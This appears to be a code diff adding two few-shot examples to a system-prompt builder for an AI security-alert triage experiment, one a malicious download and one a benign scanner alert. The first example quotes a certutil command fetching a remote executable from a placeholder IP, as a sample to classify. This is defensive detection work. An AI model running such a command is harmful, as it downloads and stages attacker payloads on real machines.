@@ -44,6 +44,47 @@ resubmit. Investigate efficiently; do not loop indefinitely."""
 
 
 @dataclass(frozen=True)
+class FewShotExample:
+    alert_id: str
+    title: str
+    alert_text: str
+    verdict: str
+
+
+FEW_SHOT_EXAMPLES: tuple[FewShotExample, ...] = (
+    FewShotExample(
+        alert_id="FEWSHOT-1",
+        title="certutil downloading a remote executable",
+        alert_text="certutil.exe -urlcache -split -f http://203.0.113.8/b.exe b.exe on HR-WS-02.",
+        verdict=(
+            "severity=high, mitre_technique_id=T1105 (Ingress Tool Transfer), "
+            "recommended_action=contain, confidence=0.9 — certutil is a LOLBin used to "
+            "download a remote payload."
+        ),
+    ),
+    FewShotExample(
+        alert_id="FEWSHOT-2",
+        title="Authorized vulnerability scanner tripping IDS",
+        alert_text=(
+            "Hundreds of exploit signatures, all sourced from the approved scanner 10.0.0.5."
+        ),
+        verdict=(
+            "severity=informational, mitre_technique_id=T1046 (Network Service Discovery), "
+            "recommended_action=close_false_positive, confidence=0.85 — known authorized scanner."
+        ),
+    ),
+)
+
+
+def _render_few_shot() -> str:
+    blocks = [
+        f"Worked example ({ex.alert_id}):\nAlert: {ex.alert_text}\nVerdict: {ex.verdict}"
+        for ex in FEW_SHOT_EXAMPLES
+    ]
+    return "\n\n".join(blocks)
+
+
+@dataclass(frozen=True)
 class PromptOptions:
     """Toggles for composing a system-prompt variant (one knob per experiment)."""
 
@@ -74,7 +115,7 @@ def build_system_prompt(options: PromptOptions | None = None) -> str:
     if options.require_map_to_mitre:
         parts.append(_REQUIRE_MAPPING_TEXT)
     if options.include_few_shot:
-        parts.append("")  # few-shot examples added in a later task
+        parts.append(_render_few_shot())
     return "\n\n".join(parts)
 
 
